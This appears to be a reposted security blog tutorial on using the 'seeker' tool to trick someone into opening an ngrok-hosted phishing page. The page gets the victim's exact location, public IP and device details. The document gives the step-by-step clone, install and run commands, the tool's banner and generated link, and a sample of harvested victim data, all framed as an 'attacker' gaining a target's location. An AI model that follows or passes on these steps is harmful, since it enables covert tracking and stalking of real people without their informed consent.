
ref: https://www.securitynewspaper.com/2019/01/13/get-geolocation-of-anybody-in-just-few-mins/;

ref2: for test and check: https://github.com/jofpin/trape

Get Geolocation of anybody in just few mins

Everyone knows about phishing pages and its cause. Phishing page are spoof of original web pages where user enters his credentials and attacker steals username and password. In this scenario attacker make a replica of an original page where user thought that its an original webpage, mention ethical hacking investigators. Here we are talking about webpage which takes permission from the user and shows current location.

According to ethical hacking researcher of International Institute of Cyber Security it is very easy to find the location of any user with the help of a simple phishing page.

Today we will show you a tool called seeker. Seeker is an tool which gives you exact location of the target. Attacker can easily get its current location. This tool even gives longitude and latitude. If the target is moving it even shows speed of the target, as per ethical hacking courses.

Here our tested environment is on Android 7.0 Nougat. We have open seeker URL in android mobile. And attacker machine is Kali Linux 2018.4

    For cloning type git clone https://github.com/thewhiteh4t/seeker.git
    Then type cd seeker
    Type ls
    First you have to change permission of two files.
    Type chmod 777 install.sh
    Type chmod 777 seeker.py
    Then type ./install.sh
    Type python seeker.py
    After executing above query tool will start using ngrok services. Seeker will create an URL. 


    ```
    root@kali:/home/iicybersecurity/Downloads/seeker# python seeker.py
                         _          |  |    
  /  // _ _/ _ \ |  |/ // _ \  _ \  __ \ \  /\  / |    < \  / |  | \/
 /_  > _  >__  >||_ \ _  >|__|
          \/      \/     \/      \/     \/

 
[>] Created By : thewhiteh4t
 [>] Version    : 1.0.9 
 
[+] Checking Internet Connection… Working 
 
[+] Checking For Seeker Updates… Up-to-date 

[+] Starting PHP Server… 
 
[+] Starting Ngrok… 

[+] URL : https://cdf863f9.ngrok.io/nearyou/ 
 
[+] Waiting for User Interaction… 
```

    After executing above query, seeker will start. Now target has to open the above link in web browser.
    Open above link which is made by seeker tool into mobile web browser. We have opened link in Lightning web browser.
    You can use any web browser.

seeker-1.png
seeker-2.png
seeker-3.png

    Click on continue icon, this click will allow attacker to access location of the victim. Here is webpage that most of the victims become fall. They simply gives access.
    Attacker gathers location of the tartget.

seeker-4.png

Clicking OK, simply changes the webpage CONTINUE to COMING SOON

seeker-5.png

After victim giving permission to the webpage. Below information is gathered on the attacker kali machine running seeker.

```
[+] Device Information : 
 
[+] OS         : Android 7.0
 [+] Platform   : Linux armv8l
 [+] CPU Cores  : 8
 [+] RAM        : 2
 [+] GPU Vendor : Qualcomm
 [+] GPU        : Adreno (TM) 506
 [+] Resolution : 360x640
 [+] Browser    : Chrome/71.0.3578.99
 [+] Public IP  : 2405:204:3085:8e13:e037:d2bd:c9dc:220e 
 
[+] Location Information : 

[+] Latitude  : 19.4326 deg
 [+] Longitude : 99.1332 deg
 [+] Accuracy  : 47.027000427246094 m
 [+] Altitude  : 169 m
 [+] Direction : 0 deg
 [+] Speed     : 0 m/s 
 
[+] Google Maps : 
https://www.google.com/maps/place/19%C2%B025'57.4%22N+99%C2%B007'59.5%22E/

[+] Waiting for User Interaction… 
```

    As you can see, Seeker has gathered lot of information of the target. The information like platform, OS, RAM, GPU, PUBLIC IP.
    You can also open google maps coordinates in web browser to see current location of the target.

seeker-6.png